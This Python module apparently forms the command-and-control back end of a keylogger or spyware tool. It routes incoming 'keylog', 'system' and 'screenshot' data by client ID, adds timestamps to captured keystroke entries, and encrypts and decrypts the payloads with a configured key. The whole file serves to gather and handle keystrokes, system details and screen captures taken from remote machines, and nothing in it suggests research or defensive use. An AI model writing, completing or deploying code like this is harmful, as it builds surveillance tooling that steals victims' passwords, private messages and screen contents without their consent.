import json
from datetime import datetime
from src.utils.encryption import encrypt_data, decrypt_data
from src.config.config_loader import load_config

config = load_config()
encryption_key = config['security']['encryption_key']

def process_incoming_data(data, data_type):
    """
    Process incoming data based on type
    """
    try:
        if data_type == 'keylog':
            return process_keylog_data(data)
        elif data_type == 'system':
            return process_system_data(data)
        elif data_type == 'screenshot':
            return process_screenshot_data(data)
        else:
            return {'error': 'Unknown data type'}
    except Exception as e:
        return {'error': str(e)}

def process_keylog_data(data):
    """
    Process keylog data
    """
    # Validate and format keylog data
    if not all(k in data for k in ['client_id', 'entries']):
        return {'error': 'Invalid keylog data format'}
    
    # Add timestamp if not present
    for entry in data['entries']:
        if 'timestamp' not in entry:
            entry['timestamp'] = datetime.utcnow().isoformat()
    
    return data

def process_system_data(data):
    """
    Process system information data
    """
    if 'client_id' not in data:
        return {'error': 'Missing client_id in system data'}
    
    return data

def process_screenshot_data(data):
    """
    Process screenshot data
    """
    if 'client_id' not in data or 'image_data' not in data:
        return {'error': 'Missing required fields in screenshot data'}
    
    return data

def encrypt_payload(data):
    """
    Encrypt data payload
    """
    json_data = json.dumps(data)
    encrypted = encrypt_data(json_data, encryption_key)
    return encrypted.decode()

def decrypt_payload(encrypted_data):
    """
    Decrypt data payload
    """
    decrypted = decrypt_data(encrypted_data, encryption_key)
    return json.loads(decrypted)